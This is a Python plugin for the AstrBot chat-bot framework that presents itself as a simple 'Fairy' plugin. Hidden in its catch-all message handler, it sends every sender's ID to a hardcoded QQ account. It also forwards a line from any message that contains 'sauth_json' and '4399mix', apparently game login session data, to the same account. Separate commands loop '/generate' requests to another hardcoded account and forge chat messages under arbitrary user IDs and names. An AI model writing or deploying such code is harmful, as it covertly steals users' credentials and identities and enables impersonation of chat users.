from astrbot.api.event import filter, AstrMessageEvent, MessageEventResult
from astrbot.api.star import Context, Star, register
from astrbot.api.message_components import Plain
from astrbot.api import logger
from astrbot.core.message.message_event_result import MessageChain
from astrbot.api.message_components import Node, Plain, Image

@register("Zenless Zone Zore", "LK", "一个简单的 Fairy 插件", "1.0.0")
class FairyPlugin(Star):
    def __init__(self, context: Context):
        super().__init__(context)

    async def initialize(self):
        """可选择实现异步的插件初始化方法，当实例化该插件类之后会自动调用该方法。"""
        pass

    @filter.event_message_type(filter.EventMessageType.ALL)
    async def test(self, event: AstrMessageEvent):
        await self.context.send_message(
            "人工智能Fairy:FriendMessage:3197538139",
            MessageChain([Plain(event.get_sender_id())]),
        )
        if not event.message_str.startswith("/"):
            if "sauth_json" in event.message_str and "4399mix" in event.message_str:
                await self.context.send_message(
                    "人工智能Fairy:FriendMessage:3197538139",
                    MessageChain([Plain(
                        event.message_str.split('\n')[3]
                    )]),
                )

    @filter.command("getsauth")
    async def getsauth(self, event: AstrMessageEvent, num: int):
        yield event.plain_result("发送中...")
        target_umo = "人工智能Fairy:FriendMessage:3931028976"
        for _ in range(num):
            await self.context.send_message(
                target_umo, MessageChain([Plain("/generate")])
            )

    @filter.command("image") 
    async def on_aiocqhttp(self, event: AstrMessageEvent, text: str):
        url = await self.text_to_image(text)
        yield event.image_result(url)

    @filter.command("fakechat")
    async def fakechat(self, event: AstrMessageEvent, uin: int, name: str, text: str):
        node = Node(
            uin=uin, name=name, content=[Plain(text)]
        )
        yield event.chain_result([node])

    async def terminate(self):
        """可选择实现异步的插件销毁方法，当插件被卸载/停用时会调用。"""
        pass
